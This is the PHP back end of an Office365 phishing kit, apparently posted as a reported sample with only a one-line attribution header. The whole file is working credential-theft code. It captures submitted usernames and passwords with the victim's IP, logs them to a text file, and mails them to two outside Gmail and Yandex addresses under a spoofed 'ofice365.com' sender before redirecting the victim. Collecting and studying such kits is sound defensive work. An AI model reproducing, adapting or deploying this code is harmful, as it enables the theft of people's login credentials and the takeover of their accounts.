//Phishing Kit Reported by @milannshrestga


<?
session_start();

$user = $_POST['username'];
$pass = $_POST['password'];

$file = fopen("tsb1.txt", "a");
$ip = getenv("REMOTE_ADDR");
$adddate=date("D M d, Y g:i a");
fputs ($file, "$adddate\r\n");
fputs ($file, "User ID: $user\r\n");
fputs ($file, "Password: $pass\r\n");
fputs ($file, "$ip\r\n");
fputs ($file, "-----------------------------------\r\n");
fclose ($file);

$ip = getenv("REMOTE_ADDR");

if((!is_numeric($user)) || ($pass == "pass"))

{
$message="=========Office365 Login=========\n
";
$message=$message."Username: $user\n
";
$message=$message."Password: $pass\n
";
$message=$message."IP: $ip\n
";
$message=$message."=========Office365 Login=========
";
mail ("Richardsmith292929@gmail.com,Richardsmith292929@yandex.com","$user , $ip","$message","From: Ofice365.com Logon<admin@ofice365.com>\n");
header("Location: Doc.php");
}
?>